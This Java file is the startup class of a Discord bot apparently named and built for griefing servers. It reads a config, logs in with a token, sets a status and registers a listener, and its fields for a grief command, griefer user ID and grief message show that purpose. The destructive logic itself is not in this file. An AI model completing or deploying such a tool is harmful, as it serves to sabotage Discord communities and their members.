//Do not touch anything from here

package de.corruptedbytes;

import java.io.IOException;

import javax.security.auth.login.LoginException;

import de.corruptedbytes.utils.Config;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.sharding.DefaultShardManagerBuilder;
import net.dv8tion.jda.api.sharding.ShardManager;

public class GriefBot {
	
	public ShardManager manager;
	public static GriefBot instance;
	
	public String botToken;
	public String griefCommand;
	public String grieferUserID;
	public String activityDescription;
	public String griefMessage;
	
	public GriefBot() throws IOException {
		instance = this;
		Config.initConfig();
		
		DefaultShardManagerBuilder builder = DefaultShardManagerBuilder.createDefault(botToken);
		
		builder.addEventListeners(new GriefBotListener());
		builder.setActivity(Activity.streaming(activityDescription, "https://www.twitch.tv/twitch"));
		builder.setStatus(OnlineStatus.ONLINE);
		
		try {
			manager = builder.build();
		} catch (LoginException | IllegalArgumentException e) {
			System.err.println("Bot cannot authenticate with Discord");
		}
		
	}
	
	public static void main(String[] args) {
		try {
			new GriefBot();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}